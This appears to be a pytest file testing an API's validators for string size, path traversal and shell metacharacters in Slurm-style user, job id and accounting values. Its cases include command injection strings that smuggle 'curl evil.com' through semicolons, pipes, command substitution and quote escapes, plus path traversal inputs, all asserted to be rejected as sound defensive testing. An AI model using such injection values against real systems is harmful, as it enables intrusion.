import pytest
from marshmallow import ValidationError

from api.validation.validators import size_not_exceeding, is_safe_path, has_no_shell_metacharacters


def test_size_not_exceeding():
    max_size = 300
    test_str_not_exceeding = 'a' * (max_size - 2) # save 2 chars for double quotes

    size_not_exceeding(test_str_not_exceeding, max_size)

def test_size_not_exceeding_failing():
    max_size = 300
    test_str_not_exceeding = 'a' * max_size # will produce "aaa...", max_size + 2

    with pytest.raises(ValidationError):
        size_not_exceeding(test_str_not_exceeding, max_size)


@pytest.mark.parametrize(
    "path, expected_result", [
        pytest.param(
            "/whatever_api_version/whatever_api_resource",
            True,
            id="safe api path absolute"
        ),
        pytest.param(
            "whatever_api_version/whatever_api_resource",
            True,
            id="safe api path relative"
        ),
        pytest.param(
            "/../whatever",
            False,
            id="unsafe path traversal 1"
        ),
        pytest.param(
            "./../whatever",
            False,
            id="unsafe path traversal 2"
        ),
        pytest.param(
            "/whatever/../whatever",
            False,
            id="unsafe path traversal 3"
        ),
        pytest.param(
            "whatever/../whatever",
            False,
            id="unsafe path traversal 4"
        ),
    ])
def test_is_safe_path(path: str, expected_result: bool):
    assert is_safe_path(path) == expected_result


@pytest.mark.parametrize(
    "value, expected_result", [
        # Legitimate user values
        pytest.param("ec2-user", True, id="default user ec2-user"),
        pytest.param("ubuntu", True, id="default user ubuntu"),
        pytest.param("john.doe", True, id="ldap user with dot"),
        pytest.param("John.Doe", True, id="ldap user with uppercase"),
        pytest.param("user@domain", True, id="kerberos user"),
        # Legitimate job_id values
        pytest.param("12345", True, id="simple job id"),
        pytest.param("12345_1", True, id="array job id"),
        pytest.param("12345_[1-5]", True, id="array job range"),
        # Legitimate sacct body values
        pytest.param("2024-01-01T00:00:00", True, id="timestamp value"),
        pytest.param("COMPLETED", True, id="job state value"),
        pytest.param("node[001-010]", True, id="nodelist value"),
        pytest.param("gpu-queue", True, id="partition value"),
        # Command injection attempts
        pytest.param("123; curl evil.com", False, id="semicolon injection with space"),
        pytest.param("123;curl evil.com", False, id="semicolon injection"),
        pytest.param("123|curl evil.com", False, id="pipe injection"),
        pytest.param("123&curl evil.com", False, id="ampersand injection"),
        pytest.param("$(curl evil.com)", False, id="command substitution dollar"),
        pytest.param("`curl evil.com`", False, id="command substitution backtick"),
        pytest.param("123\ncurl evil.com", False, id="newline injection"),
        pytest.param("ec2-user' -c 'curl evil.com", False, id="quote escape injection"),
        pytest.param('ec2-user" -c "curl evil.com', False, id="double quote injection"),
        pytest.param("123>/tmp/out", False, id="redirection injection"),
        pytest.param("123\\ncurl evil.com", False, id="backslash injection"),
    ])
def test_has_no_shell_metacharacters(value: str, expected_result: bool):
    assert has_no_shell_metacharacters(value) == expected_result
